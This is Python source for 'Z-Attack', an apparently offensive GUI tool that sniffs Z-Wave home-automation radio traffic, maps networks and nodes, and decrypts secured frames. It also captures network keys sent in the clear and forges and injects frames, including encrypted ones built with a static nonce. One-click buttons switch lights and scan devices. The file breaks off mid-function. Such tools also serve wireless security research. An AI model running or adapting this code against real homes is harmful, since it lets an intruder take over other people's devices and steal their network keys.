import serial
import binascii
import pydot
import datetime
import re
from Crypto.Cipher import AES
from Crypto import Random
import sys
from xml.dom.minidom import parse
import xml.dom.minidom
import xml.etree.ElementTree as ET
from xml.dom import minidom
import struct
from serial import *
from Tkinter import *
from PIL import ImageTk, Image

try:
	from rflib import *
except ImportError:
	print "Error : rflib not installed ,  Rfcat will not work\n"

#import external files
import zwClasses
import sendData

debug =0
nonce = ""
nonce_other = "000"
frame_nb = 0
key  = "0102030405060708090A0B0C0D0E0F10"
Zwave_dic = dict()

def ByteToHex( byteStr ):
	return ''.join( [ "%02X" % ord( x ) for x in byteStr ] ).strip()

def checksum(data):
	b = 255
	for i in range(2,len(data)):
		b ^= int(data[i].encode("hex"),16)
	print "	-> Checksum :",format(b, '02x')
	return format(b, '02x').decode("hex")

def sendingMode():
	if deviceData == 2:
		print("[*] Opening serial port")
		try:
			serialSend=serial.Serial(port=scom, baudrate=115000, bytesize=serial.EIGHTBITS,parity=serial.PARITY_NONE, stopbits=serial.STOPBITS_ONE, timeout=1)			
		except:
			print "Error while sending data to " + scom

	print("[*] Writing in progress")
	print "[*] Sending data to network :", homeID_userInput.get()
	print "	-> DstNode :", DstNode_userInput.get()
	print "	-> SrcNode :", SrcNode_userInput.get()
	
	zclass = Zclass_userInput.get()

	#Header (Preambule + Start of Frame Delimiter)
	d_init = "\x00\x0E" 

	#homeID 4 bytes
	d_homeID = homeID_userInput.get().decode("hex")
	#srcNode 1 byte
	d_SrcNode = SrcNode_userInput.get().decode("hex")
	#d_header = "\x41\x01"
	d_header = "\x41\x01"
	#dstNode 1 byte
	d_DstNode = DstNode_userInput.get().decode("hex")

	d_payload = zclass
	print "	-> Payload :",d_payload
	d_payload = d_payload.decode("hex")

	if valueCheckbtn_Secure.get():
		print "[*] Sending secure frame"
		d_payload_encrypted = generateEncryptedPayload(d_SrcNode,d_DstNode,d_payload)
		print "	-> Full Encoded Payload :",d_payload_encrypted.encode('hex')

		d_lenght = len(d_payload_encrypted) + len(d_homeID) + len(d_header) + 4
		d_lenght = format(d_lenght, '02x')
		print "	-> Lenght :", d_lenght
		d_lenght = d_lenght.decode("hex")

		d_checksum = checksum(d_init+d_homeID+d_SrcNode+d_header+d_lenght+d_DstNode+d_payload_encrypted)
		if deviceData == 2:

			serialSend.write(d_init+d_homeID+d_SrcNode+d_header+d_lenght+d_DstNode+d_payload_encrypted+d_checksum)
			serialSend.close()
		else:
			data = d_homeID+d_SrcNode+d_header+d_lenght+d_DstNode+d_payload_encrypted+d_checksum
			print "	-> DATA :", data.encode("hex")
			d.RFxmit(invert(data))
		print("[*] Done")
	else:
		print "[*] Sending unsecure frame"
		d_lenght = len(d_payload) + len(d_homeID) + len(d_header) + 4
		d_lenght = format(d_lenght, '02x')
		print "	-> Lenght :", d_lenght
		d_lenght = d_lenght.decode("hex")

		#Checksum
		# Don't know why I need d_init for the checksum
		d_checksum = checksum(d_init+d_homeID+d_SrcNode+d_header+d_lenght+d_DstNode+d_payload)

		if deviceData == 2:
			serialSend.write(d_init+d_homeID+d_SrcNode+d_header+d_lenght+d_DstNode+d_payload+d_checksum)
			serialSend.close()
		else:

			data = d_homeID+d_SrcNode+d_header+d_lenght+d_DstNode+d_payload+d_checksum
			print "	-> DATA :", data.encode("hex")
			d.RFxmit(invert(data))
		print("[*] Done")

def sendingModeRAW(pPayload):
	#Header (Preambule + Start of Frame Delimiter)
	d_init = "\x00\x0E"
	d_header = "\x41\x01"

	i=listboxMainHomeID.curselection()
	d_homeID = listboxMainHomeID.get(i)
	d_homeID = d_homeID.decode("hex")

	d_payload = pPayload

	if deviceData == 2:
		print("[*] Opening serial port")
		try:
			serialSend=serial.Serial(port=scom, baudrate=115000, bytesize=serial.EIGHTBITS,parity=serial.PARITY_NONE, stopbits=serial.STOPBITS_ONE, timeout=1)			
		except:
			print "Error while sending data to " + scom
	print("[*] Writing in progress")
	print "[*] Sending data to network :", d_homeID.encode("hex")
	#Checksum
	d_checksum = checksum(d_init+d_homeID+d_payload)

	if deviceData == 2:
		serialSend.write(d_init+d_homeID+d_payload+d_checksum)
		serialSend.close()
	else:
		data = d_homeID+d_payload+d_checksum
		print "	-> DATA :", data.encode("hex")
		d.RFxmit(invert(data))
	print("[*] Done")

def ByteToHex( byteStr ):
	return ''.join( [ "%02X" % ord( x ) for x in byteStr ] ).strip()
	
def generate_encrypt_key(key):
	temp_key = key.decode("hex")
	# Default static key for encryption
	msg = b'\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa'
	cipher = AES.new(temp_key, AES.MODE_ECB)
	return cipher.encrypt(msg).encode('hex')

def generate_mac_key(key):
	temp_key = key.decode("hex")
	# Default static key for authentication
	msg = b'\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55'
	cipher = AES.new(temp_key, AES.MODE_ECB)
	return cipher.encrypt(msg).encode('hex')

def generateEncryptedPayload(sNode,dNode,payload_to_encrypt):
	# We first need to ask a nonce from the device
	# That's gonna be a tough one (asynchrone mode :-/), so ask to the user
	nonce_remote_device = Nonce_userInput.get() # SecurityCmd_NonceGet

	CCMsgEncap = "\x98\x81" # SecurityCmd_MessageEncap
	sequence = "\x81" # Sequence number : Encrypted data
	nonce = "aaaaaaaaaaaaaaaa" # Static nonce and we don't care, we are the bad guy here :-)
	nonceId = nonce_remote_device[:2]
	print "	-> nonceId :", nonceId

	iv = nonce + nonce_remote_device

	payload_to_encrypt = "\x00" + payload_to_encrypt # Sequence + payload to encrypt

	payload_to_encrypt = payload_to_encrypt.encode("hex")
	print "	-> Payload to encrypt :", payload_to_encrypt
	print "	-> IV :", iv
	iv = iv.decode("hex")

	# Padding 16 bytes msg
	padding = ""
	lenght_payload = len(payload_to_encrypt)/2
	print "	-> lenght_payload :", lenght_payload
	padding_lenght = 32 - (lenght_payload*2)
	for pad in range(0,padding_lenght):
		padding = padding + "0"
	payload_to_encrypt = str(payload_to_encrypt) + padding
	print "	-> Payload with padding :", payload_to_encrypt

	payload_to_encrypt = payload_to_encrypt.decode("hex")

	# Generate Encoded Payload
	encrypt_key = generate_encrypt_key(key).decode("hex")
	print "	-> encrypt_key :", encrypt_key.encode("hex")
	cipher = AES.new(encrypt_key, AES.MODE_OFB, iv )
	encodedPayload = cipher.encrypt(payload_to_encrypt)
	print "	-> encodedPayload :", encodedPayload.encode("hex")

	# Split payload to initial lenght
	encodedPayload = encodedPayload[:lenght_payload]
	print "	-> encodedPayload (split) :", encodedPayload.encode("hex")

	print "	-> sNode :", sNode.encode("hex")
	print "	-> dNode :", dNode.encode("hex")

	# Generate MAC Payload to encrypt with MAC key
	authentication_RAW = sequence.encode("hex") + sNode.encode("hex") + dNode.encode("hex") + ("%0.2X" % lenght_payload) + encodedPayload.encode("hex")
	print "	-> MAC Raw :", authentication_RAW

	# Generate MAC key (ECB)
	authentication_key = generate_mac_key(key).decode("hex")
	print "	-> MAC_key :", authentication_key.encode("hex")

	# Encrypt IV with ECB
	cipher = AES.new(authentication_key, AES.MODE_ECB)
	tempAuth = cipher.encrypt(iv)
	print "	-> Encoded IV :", tempAuth.encode('hex')

	# Padding 16 bytes msg for MAC
	padding = ""
	lenght_mac = len(authentication_RAW)/2
	padding_lenght = 32 - (lenght_mac*2)
	for pad in range(0,padding_lenght):
		padding = padding + "0"
	authentication_RAW = str(authentication_RAW) + padding
	print "	-> MAC with padding :", authentication_RAW

	# XOR with encrypted IV
	l1 = int(authentication_RAW, 16)
	l2 = int(tempAuth.encode('hex'), 16)
	xored=format(l1 ^ l2, 'x')
	print "	-> XOR MAC :", xored
	if len(xored) != 32:
		xored = "0" + xored
	print "	-> XOR MAC (16 bytes) :", xored

	#Encrypt MAC ECB
	xored = xored.decode("hex")
	cipher = AES.new(authentication_key, AES.MODE_ECB)
	encodedMAC = cipher.encrypt(xored)
	print "	-> Encoded MAC :", encodedMAC.encode('hex')

	# Split MAC to 8 bytes
	encodedMAC = encodedMAC[:8]
	print "	-> Encoded MAC (split) :", encodedMAC.encode("hex")

	EncodedFrame = CCMsgEncap + nonce.decode("hex") + encodedPayload + nonceId.decode("hex") + encodedMAC

	return EncodedFrame

def decrypt( payload_enc, nonce_other,nonce_device,payload,lenght_encrypted_payload ):
	global key
	result = ""
	if len(key)==32:
		encrypt_key = generate_encrypt_key(key)
		key_aes = encrypt_key.decode("hex")
		if nonce_device and nonce_other:
			iv = nonce_device + nonce_other
			
			# Padding 16 bytes msg
			padding = ""
			#Encrypted Packet Size is Packet Lenght - Device Nonce(8) - Reciever Nonce ID (1) - Mac (8) - CommandClass - Command
			if (lenght_encrypted_payload) > 16 and (lenght_encrypted_payload) < 32 : # More than 1 block to decrypt
				if debug: print "			[2 BLOCKS CIPHER TO DECRYPT] (hex):"
				
				payload_enc_block1 = payload_enc[0:32]
				payload_enc_block2 = payload_enc[32:]
				print payload_enc_block1
				print payload_enc_block2
				lenght_payload_enc_block2 = len(payload_enc_block2)/2
				padding_lenght = 32 - (lenght_payload_enc_block2*2)
				for pad in range(0,padding_lenght): # 16 => Device Nonce(8) - 4 bytes CC /Command - 4 bytes CC  - 8 lenght MAC authentication
					padding = padding + "0"
				payload_enc_block2 = str(payload_enc_block2) + padding

				if debug: print "			[MSG TO DECODE] (hex):"+payload_enc
				payload_enc_block1 = payload_enc_block1.decode("hex")
				payload_enc_block2 = payload_enc_block2.decode("hex")
				

				try:
					iv =  iv.decode("hex")
					print "			[IV] (hex) : "+iv.encode('hex')
					
					cipher = AES.new(key_aes, AES.MODE_OFB, iv )
					result1 = cipher.decrypt(payload_enc_block1).encode('hex')
					result2 = cipher.decrypt(payload_enc_block2).encode('hex')
					result = result1+result2
					print "			[DECODED] Payload (hex): "+result
				except:
					print "Error during decrypting"
			else:
				padding_lenght = 32 - (lenght_encrypted_payload*2)
				for pad in range(0,padding_lenght): # 16 => Device Nonce(8) - 4 bytes CC /Command - 4 bytes CC  - 8 lenght MAC authentication
					padding = padding + "0"
				payload_enc = str(payload_enc) + padding
				if debug: print "			[MSG TO DECODE] (hex):"+payload_enc
				payload_enc = payload_enc.decode("hex")
				
				try:
					iv =  iv.decode("hex")
					print "			[IV] (hex) : "+iv.encode('hex')
					cipher = AES.new(key_aes, AES.MODE_OFB, iv )
					result = cipher.decrypt(payload_enc).encode('hex')
					print "			[DECODED] Payload (hex): "+result
				except:
					print "Error during decrypting"
	
	else:
		print "			[DEBUG] Error with network key"
		result = ""
	return result[2:]
		
def zclassFinder(payload,HomeID,SrcNode):
	#Payload analysis
	global nonce_other
	ZwClass = payload[0:2]

	param = cc = cmd = mapManufacturer = "" 

	if ZwClass in zwClasses.ZwaveClass.keys():
		print "		CommandClass=", zwClasses.ZwaveClass[ZwClass]['name']
		CmdClass = payload[2:4]
		cc = zwClasses.ZwaveClass[ZwClass]['name']
		if CmdClass in zwClasses.ZwaveClass[ZwClass].keys():
			print "		Command=", zwClasses.ZwaveClass[ZwClass][CmdClass]
			cmd = zwClasses.ZwaveClass[ZwClass][CmdClass]

			param = cc+"  |  "+cmd+"("

			if zwClasses.ZwaveClass[ZwClass][CmdClass] == "SecurityCmd_MessageEncap":
				lenght_encrypted_payload = (len(payload)/2) - 8 - 2 - 8 # MAC(8bytes)  + CC + C + nonce(8bytes) 
				if debug: print "		[DEBUG][lenght_encrypted_payload] :"+str(lenght_encrypted_payload)+" bytes"
				nonce_device=payload[4:20]
				payload_enc=payload[20:(lenght_encrypted_payload)*2+20]
				auth_enc=payload[-16:]
				if debug: print "		[DEBUG][Nonce]="+nonce_device+"	[Encrypted payload]="+payload_enc+"	[Authentication MAC]="+auth_enc
				if nonce_other:
					payloadDecoded = decrypt(payload_enc,nonce_other,nonce_device,payload,lenght_encrypted_payload)
					payload = payloadDecoded
					try:
						if debug : "		[DEBUG] payloadDecoded "+payloadDecoded
						# Change CmdClass and ZwClass to the unencrypted one
						ZwClass = payloadDecoded[0:2]
						CmdClass = payloadDecoded[2:4]
						cc = zwClasses.ZwaveClass[ZwClass]['name']
						cmd = zwClasses.ZwaveClass[ZwClass][CmdClass]
						param += cc+"|"+cmd+"("
					except:
						print "		[Error during decrypting data]"
						return
				else:
					print "		[DEBUG] Unable to decrypt - no device nounce"		

			if zwClasses.ZwaveClass[ZwClass][CmdClass] == "ManufacturerSpecificCmd_Report":
				manufacturer = payload[4:8]
				product = payload[8:12]
				
				# Parse XML file to find manufacturer
				xmldoc = minidom.parse('manufacturer_specific.xml')
				manufacturers_xml = xmldoc.getElementsByTagName('Manufacturer')
				for s in manufacturers_xml:
					if manufacturer == s.attributes['id'].value:
						manufacturer=s.attributes['name'].value
						products_xml = s.getElementsByTagName('Product')
						for product_xml in products_xml:
							if product == product_xml.attributes['type'].value:
								product = product_xml.attributes['name'].value
				print "		Manufacturer="+manufacturer+"		Product="+product
				param += "Manufacturer="+manufacturer+"|Product="+product
				mapManufacturer = "Manufacturer="+manufacturer+"|Product="+product

				for i in range(len(Zwave_dic[HomeID])):
					if SrcNode in Zwave_dic[HomeID][i]:
						Zwave_dic[HomeID][i] = [SrcNode,manufacturer+" | "+product]

			elif zwClasses.ZwaveClass[ZwClass][CmdClass] == "SecurityCmd_NonceReport":
				nonce_other=payload[4:20]
				if debug: print "		[DEBUG][GET Nonce] :"+nonce_other
				param += nonce_other

			elif zwClasses.ZwaveClass[ZwClass][CmdClass] == "VersionCmd_Report":
				lib=payload[4:6]
				protocol_hex=payload[6:10]
				application_hex=payload[10:14]

				lib = str(int(lib, 16))
				if lib in zwClasses.LIBRARY.keys():
					lib = zwClasses.LIBRARY[lib]
					
				protocol = str(int(protocol_hex[:2],16))+"."+str(int(protocol_hex[2:4],16))
				application = str(int(application_hex[:2],16))+"."+str(int(application_hex[2:4],16))
				
				print "		library="+lib+"	protocol="+protocol+"	application="+application
				param += "library="+lib+"|protocol="+protocol+"|application="+application

			elif zwClasses.ZwaveClass[ZwClass][CmdClass] == "BatteryCmd_Report":
				param1=payload[4:6]
				if param1 == "ff":
					print "		Param[1]= (Battery = 0)"
					param += "Battery = 0"									
				else:
					print "		Param[1]= (Battery = "+str(int(param1,16))+")"
					param += "Battery = "+str(int(param1,16))

			elif zwClasses.ZwaveClass[ZwClass][CmdClass] == "SwitchBinaryCmd_Set" or zwClasses.ZwaveClass[ZwClass][CmdClass] == "SwitchBinaryCmd_Report" or zwClasses.ZwaveClass[ZwClass][CmdClass] == "BasicCmd_Report" or zwClasses.ZwaveClass[ZwClass][CmdClass] == "BasicCmd_Set" or zwClasses.ZwaveClass[ZwClass][CmdClass] == "SensorBinaryCmd_Report" or zwClasses.ZwaveClass[ZwClass][CmdClass] == "SwitchMultilevelCmd_Report":
				param1=payload[4:6]
				if param1 == "ff":
					print "		Param[1]= On"
					param += "On"									
				if param1 == "00":
					print "		Param[1]= Off"
					param += "Off"

			elif zwClasses.ZwaveClass[ZwClass][CmdClass] == "SecurityCmd_NetworkKeySet":
				key = payload[4:36]
				print "			[NETWORK KEY] (hex) : "+key
				param += key

			elif zwClasses.ZwaveClass[ZwClass][CmdClass] == "MeterCmd_Report":
				val= payload[12:16]
				param += str(int(val, 16)/1000) + " Watts"

			elif zwClasses.ZwaveClass[ZwClass][CmdClass] == "SensorAlarmCmd_Report":
				param1=payload[4:6]
				if param1 == "00":
					print "		Param[1]= General Purpose Alarm"
					param += "General Purpose Alarm"		
				elif param1 == "01":
					print "		Param[1]= Smoke Alarm"
					param += "Smoke Alarm"									
				elif param1 == "02":
					print "		Param[1]= CO Alarm"
					param += "CO Alarm"
				elif param1 == "03":
					print "		Param[1]= CO2 Alarm"
					param += "CO2 Alarm"
				elif param1 == "04":
					print "		Param[1]= Heat Alarm"
					param += "Heat Alarm"
				elif param1 == "05":
					print "		Param[1]= Water Leak Alarm"
					param += "Water Leak Alarm"

			elif zwClasses.ZwaveClass[ZwClass][CmdClass] == "PowerlevelCmd_Report":
				param1=payload[4:6]
				if param1 == "00":
					print "		Param[1]= Normal"
					param += "Normal"		
				elif param1 == "01":
					print "		Param[1]= -1dB"
					param += "-1dB"									
				elif param1 == "02":
					print "		Param[1]= -2dB"
					param += "-2dB"
				elif param1 == "03":
					print "		Param[1]= -3dB"
					param += "-3dB"
				elif param1 == "04":
					print "		Param[1]= -4dB"
					param += "-4dB"
				elif param1 == "05":
					print "		Param[1]= -5dB"
					param += "-5dB"
				elif param1 == "06":
					print "		Param[1]= -6dB"
					param += "-6dB"
				elif param1 == "07":
					print "		Param[1]= -7dB"
					param += "-7dB"
				elif param1 == "08":
					print "		Param[1]= -8dB"
					param += "-8dB"
				elif param1 == "09":
					print "		Param[1]= -9dB"
					param += "-9dB"

			elif zwClasses.ZwaveClass[ZwClass][CmdClass] == "ThermostatModeCmd_Report":
				param1=payload[4:6]
				if param1 == "00":
					print "		Param[1]= Off"
					param += "Off"		
				elif param1 == "01":
					print "		Param[1]= Heat"
					param += "Heat"									
				elif param1 == "02":
					print "		Param[1]= Cool"
					param += "Cool"
				elif param1 == "03":
					print "		Param[1]= Auto"
					param += "Auto"
				elif param1 == "04":
					print "		Param[1]= Auxiliary/Emergency Heat"
					param += "Auxiliary/Emergency Heat"
				elif param1 == "05":
					print "		Param[1]= Resume"
					param += "Resume"
				elif param1 == "06":
					print "		Param[1]= Fan Only"
					param += "Fan Only"
				elif param1 == "07":
					print "		Param[1]= Furnace"
					param += "Furnace"
				elif param1 == "08":
					print "		Param[1]= Dry Air"
					param += "Dry Air"
				elif param1 == "09":
					print "		Param[1]= Moist Air"
					param += "Moist Air"
				elif param1 == "10":
					print "		Param[1]= Auto Changeover"
					param += "Auto Changeover"
				elif param1 == "11":
					print "		Param[1]= Energy Save Heat"
					param += "Energy Save Heat"
				elif param1 == "12":
					print "		Param[1]= Energy Save Cool"
					param += "Energy Save Cool"
				elif param1 == "13":
					print "		Param[1]= AWAY"
					param += "AWAY"

			elif zwClasses.ZwaveClass[ZwClass][CmdClass] == "ProtectionCmd_Report":
				param1=payload[4:6]
				if param1 == "00":
					print "		Param[1]= Unprotected"
					param += "Unprotected"		
				elif param1 == "01":
					print "		Param[1]= Protection by sequence"
					param += "Protection by sequence"									
				elif param1 == "02":
					print "		Param[1]= No operation possible"
					param += "No operation possible"

			elif zwClasses.ZwaveClass[ZwClass][CmdClass] == "SwitchAllCmd_Report":
				param1=payload[4:6]
				if param1 == "00":
					print "		Param[1]= Excluded from the all on/all off functionality"
					param += "Excluded from the all on/all off functionality"		
				elif param1 == "01":
					print "		Param[1]= Excluded from the all on functionality but not all off"
					param += "Excluded from the all on functionality but not all off"									
				elif param1 == "02":
					print "		Param[1]= Excluded from the all off functionality but not all on"
					param += "Excluded from the all off functionality but not all on"
				elif param1 == "ff":
					print "		Param[1]= Included in the all on/all off functionality"
					param += "Included in the all on/all off functionality"


			param += ")"
	else:
		param = "UNKNOWN"
	return param


def invert(data):
	datapost = ''
	for i in range(len(data)):
		datapost += chr(ord(data[i]) ^ 0xFF)
	return datapost

def calculateChecksum(data):
	checksum = 0xff
	for i in range(len(data)):
		checksum ^= ord(data[i])
	return checksum

def listeningMode():
		global frame_nb
		payload = ""
		res = ""

		# TI Dev KIT
		if deviceData == 2:	
			bytesToRead = serialListen.inWaiting()
			res = serialListen.read(bytesToRead)
			res = res[2:]
		# Retrieve data from Rfcat
		else:
			try:
				# Rfcat
				res = d.RFrecv(10)[0]
				# Invert frame for 40Mhz Bandwith - cf BH 2013 (sensepost)
				res = invert(res)
			except ChipconUsbTimeoutException:
				pass

		if res:
			print ""
			print str(datetime.datetime.now())
			if debug: print "	[DEBUG Serial data received] "+res.encode("hex")

			# Check is several frames in one
			frames = re.split("\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\xf0",res)

			if debug: print "	[Number of frames] "+ str(len(frames))

			for frame in frames:
				res = frame
				print ""
				if debug: print '	[DEBUG Frame] '+res.encode("hex")
				# Control the lenght of the frame
				
				try:
					lenght = ord(res[7])
					res = res[0:lenght]
					# Check CRC and remove noise
					fcs=res[-1]
					res = res[:-1] # Remove FCS
					calculatedchecksumFrame = calculateChecksum(res)
					if calculatedchecksumFrame != ord(fcs):
						print "	Checksum: ", fcs.encode("hex"), "(Incorrect)"
						res = ""
				except:
					# Problem during Checksum process (frame too short?)
					print "	[Error during FCS calc : Dropped] "
					print "	[Frame] " + res

				if res: # if we still have a frame to decode
					res = res.encode("hex")

					# PATCH REMOVE UNUSEFUL DATA (Do not know why :-))
					res = re.sub(r'00[0-1][0-1][0-1][a-f0-9]', '',res)
					res = re.sub(r'2[a-f0-9]00fa[a-f0-9][a-f0-9][a-f0-9][a-f0-9]00000','',res)
					res = re.sub(r'2[a-f0-9]00fa[a-f0-9][a-f0-9][a-f0-9][a-f0-9]','',res)

					# Decode Zwave frame 
					HomeID = res[0:8]			
					SrcNode = res[8:10]
					FrameControl = res[10:14]
					Length = res[14:16]
					DstNode = res[16:18]
					payload = res[18:]
											
					if Length == "0a": # ACK frame is a 0 byte payload => 0A cf G.9959
						print "	ACK response from "+SrcNode+" to "+DstNode
					
					if len(payload)<128 and len(payload)>0: # Payload for Zwave 64 bytes max
						print "	Zwave frame:"
						print "		HomeID=", HomeID
						print "		SrcNode=", SrcNode
						print "		DstNode=", DstNode
						print "		Checksum=", fcs.encode("hex")
		
						if DstNode == "ff":
							print "		[*] Broadcast frame"
						
						# Generate a list of HomeID and Nodes
						if HomeID in Zwave_dic.keys():
							if SrcNode:
								tt = 0
								for i in range(len(Zwave_dic[HomeID])):
									if SrcNode in Zwave_dic[HomeID][i]:
										tt = 1	
								if tt == 0:
									list_SrcNode = [SrcNode,'']
									Zwave_dic[HomeID].append(list_SrcNode)
							if DstNode and DstNode!= "ff":
								tt = 0
								for i in range(len(Zwave_dic[HomeID])):
									if DstNode in Zwave_dic[HomeID][i]:
										tt = 1	
								if tt == 0:
									list_DstNode= [DstNode,'']
									Zwave_dic[HomeID].append(list_DstNode)
						else:
							if SrcNode:
								list_SrcNode = [[SrcNode,'']]
								Zwave_dic[HomeID] = list_SrcNode
							if DstNode and DstNode!= "ff":
								list_DstNode= [DstNode,'']
								Zwave_dic[HomeID].append(list_DstNode)

							listboxMainHomeID.delete(0, END)
							for id in Zwave_dic.keys():
								listboxMainHomeID.insert(END,id)

						decodedPayload = zclassFinder(payload,HomeID,SrcNode)
						if decodedPayload:
							#Count frame number
							frame_nb = frame_nb + 1

							# Write output to user
							log.insert('0.0', "\n"+str(frame_nb)+"  |  "+str(datetime.datetime.now())+"  |  "+HomeID+"  |  "+SrcNode+"  |  "+DstNode+"  |  "+decodedPayload)
							log.insert('0.0',"\n-----------------------------------------------------------------------------------------------------------------------------------------------------")
							
							# Write output to file (CSV)
							if fOutput:
								fOutputCSV = open("output/result.txt", "a")
								fOutputCSV.write("\n"+str(frame_nb)+"  |  "+str(datetime.datetime.now())+"  |  "+HomeID+"  |  "+SrcNode+"  |  "+DstNode+"  |  "+decodedPayload+"  |  "+payload)
								fOutputCSV.write("\n-----------------------------------------------------------------------------------------------------------------------------------------------------")
								fOutputCSV.close()
							
							if debug: print "	[DEBUG] Payload=", payload


		root.after(1, listeningMode) # Loop			
		
def windowSendAdvanced_selectHomeID(evt): 
	i=listBoxSelectHomeID.curselection()
	HomeId_auto.set(listBoxSelectHomeID.get(i))
	listBoxSelectSrc.delete(0, END)
	listBoxSelectDst.delete(0, END)

	for j in range(len(Zwave_dic[listBoxSelectHomeID.get(i)])):
		listBoxSelectSrc.insert(END,Zwave_dic[listBoxSelectHomeID.get(i)][j][0])
		listBoxSelectDst.insert(END,Zwave_dic[listBoxSelectHomeID.get(i)][j][0])

def windowSendAdvanced_selectSrc(evt): 
	i=listBoxSelectSrc.curselection()
	Src_auto.set(listBoxSelectSrc.get(i))

def windowSendAdvanced_selectDst(evt): 
	i=listBoxSelectDst.curselection()
	Dst_auto.set(listBoxSelectDst.get(i))

def windowSendAdvanced_selectCC(evt): 
	i=listBoxSelectCC.curselection()
	Zclass_auto.set(sendData.CmdClassToSend[listBoxSelectCC.get(i)].encode("hex"))

def windowAbout():
	w_about = Toplevel()
	w_about.wm_title("About")
	w_about.resizable(width=FALSE, height=FALSE)
	frame = Frame(w_about, width=200, height = 50)
	frame.grid(row=0, column=1, padx=10, pady=2)
	Label(frame, text="Z-Attack 0.1").grid(row=0, column=0, padx=10, pady=2)
	Label(frame, text="Author : Advens").grid(row=1, column=0, padx=10, pady=2)
	
def windowSendAdvanced():
	global valueCheckbtn_Secure,listBoxSelectHomeID,listBoxSelectSrc,listBoxSelectDst,listBoxSelectCC,HomeId_auto,Dst_auto,Src_auto,Zclass_auto,homeID_userInput,DstNode_userInput,SrcNode_userInput,Zclass_userInput,Nonce_userInput
	w_send = Toplevel()
	w_send.wm_title("Z-Attack - Send Z-Wave frame (Advanced mode)")
	w_send.resizable(width=FALSE, height=FALSE)

	rightFrame = Frame(w_send, width=200, height = 600)
	rightFrame.grid(row=0, column=1, padx=10, pady=2)
	Label(rightFrame, text="Emission:").grid(row=0, column=0, padx=10, pady=2)

	HomeId_auto = StringVar()
	Label(rightFrame, text="HomeID:").grid(row=1, column=0, padx=10, pady=2)
	homeID_userInput = Entry(rightFrame, width = 10, textvariable=HomeId_auto)
	homeID_userInput.grid(row=1, column=1, padx=10, pady=2)

	Dst_auto = StringVar()
	Label(rightFrame, text="DstNode:").grid(row=2, column=0, padx=10, pady=2)
	DstNode_userInput = Entry(rightFrame, width = 10, textvariable=Dst_auto)
	DstNode_userInput.grid(row=2, column=1, padx=10, pady=2)

	Src_auto = StringVar()
	Label(rightFrame, text="SrcNode:").grid(row=3, column=0, padx=10, pady=2)
	SrcNode_userInput = Entry(rightFrame, width = 10, textvariable=Src_auto)
	SrcNode_userInput.grid(row=3, column=1, padx=10, pady=2)

	Zclass_auto = StringVar()
	Label(rightFrame, text="Zclass:").grid(row=4, column=0, padx=10, pady=2)
	Zclass_userInput = Entry(rightFrame, width = 20, textvariable=Zclass_auto)
	Zclass_userInput.grid(row=4, column=1, padx=10, pady=2)

	Nounce_auto = StringVar()
	Label(rightFrame, text="Nonce:").grid(row=5, column=0, padx=10, pady=2)
	Nonce_userInput = Entry(rightFrame, width = 20, textvariable=Nounce_auto)
	Nonce_userInput.grid(row=5, column=1, padx=10, pady=2)

	# Secure frame
	valueCheckbtn_Secure = IntVar()
	checkbuttonSecure = Checkbutton(rightFrame, text="Secure (Nonce required)", variable=valueCheckbtn_Secure).grid(row=6, column=1, padx=10, pady=2)

	buttonSend = Button(rightFrame, text="Send", command=sendingMode)
	buttonSend.grid(row=7, column=1, padx=20, pady=2)
			
	bottomFrame = Frame(w_send, width=200, height = 600)
	bottomFrame.grid(row=0, column=0, padx=10, pady=2)

	Label(bottomFrame, text="HomeID:").grid(row=14, column=0, padx=10, pady=2)
	listBoxSelectHomeID = Listbox(bottomFrame, selectmode=SINGLE)
	listBoxSelectHomeID.grid(row=14, column=1, padx=10, pady=2)
	listBoxSelectHomeID.bind('<ButtonRelease-1>',windowSendAdvanced_selectHomeID)

	Label(bottomFrame, text="src:").grid(row=14, column=2, padx=10, pady=2)
	listBoxSelectSrc = Listbox(bottomFrame, selectmode=SINGLE)
	listBoxSelectSrc.config(width=10)
	listBoxSelectSrc.grid(row=14, column=3, padx=10, pady=2)
	listBoxSelectSrc.bind('<ButtonRelease-1>',windowSendAdvanced_selectSrc)

	Label(bottomFrame, text="dst:").grid(row=14, column=4, padx=10, pady=2)
	listBoxSelectDst = Listbox(bottomFrame, selectmode=SINGLE)
	listBoxSelectDst.config(width=10)
	listBoxSelectDst.grid(row=14, column=5, padx=10, pady=2)
	listBoxSelectDst.bind('<ButtonRelease-1>',windowSendAdvanced_selectDst)

	Label(bottomFrame, text="CC:").grid(row=14, column=6, padx=10, pady=2)
	listBoxSelectCC = Listbox(bottomFrame, selectmode=SINGLE)
	listBoxSelectCC.config(width=70)
	listBoxSelectCC.grid(row=14, column=7, padx=20, pady=2)
	listBoxSelectCC.bind('<ButtonRelease-1>',windowSendAdvanced_selectCC)
	
	#s1 = Scrollbar(bottomFrame, command=listBoxSelectCC.yview)
	#s1.grid(row=14, column=7, sticky='nsew')
	#listBoxSelectCC['yscrollcommand'] = s1.set

	for id in Zwave_dic.keys():
		listBoxSelectHomeID.insert(END,id)
	for CC in sorted(sendData.CmdClassToSend):#CC
		listBoxSelectCC.insert(END,CC)

def scanZwaveNetwork():
	# MANUFACTURER_GET
	sendingModeRAW("\x01\x41\x01\x0e\xff\x72\x04\x00\x86")

def windowSendEasy():
	w_sendEasy = Toplevel()
	w_sendEasy.wm_title("Z-Attack - Send Z-Wave frame (Easy mode)")
	w_sendEasy.resizable(width=FALSE, height=FALSE)
	frame_WindowSendEasy = Frame(w_sendEasy, width=200, height = 600)
	frame_WindowSendEasy.grid(row=0, column=1, padx=10, pady=2)

	i=listboxMainHomeID.curselection()
	if i:
		#frameWindowSendEasy = Frame(w_sendEasy, width=200, height = 600)
		#frameWindowSendEasy.grid(row=0, column=1, padx=10, pady=2)

		buttonDiscovery = Button(frame_WindowSendEasy, text="Network Discovery (Find Nodes and Manufacturer)", command=lambda: scanZwaveNetwork())
		buttonDiscovery.grid(row=1, column=1, padx=20, pady=2)

		buttonTurnOnLight = Button(frame_WindowSendEasy, text="Turn On Lights", command=lambda: sendingModeRAW("\x01\x41\x01\x0e\xff\x25\x01\xff\x4c"))
		buttonTurnOnLight.grid(row=2, column=1, padx=20, pady=2)

		buttonTurnOffLight = Button(frame_WindowSendEasy, text="Turn Off Lights", command=lambda: sendingModeRAW("\x01\x41\x01\x0e\xff\x25\x01\x00\x4c"))
		buttonTurnOffLight.grid(row=3, column=1, padx=20, pady=2)
	else:
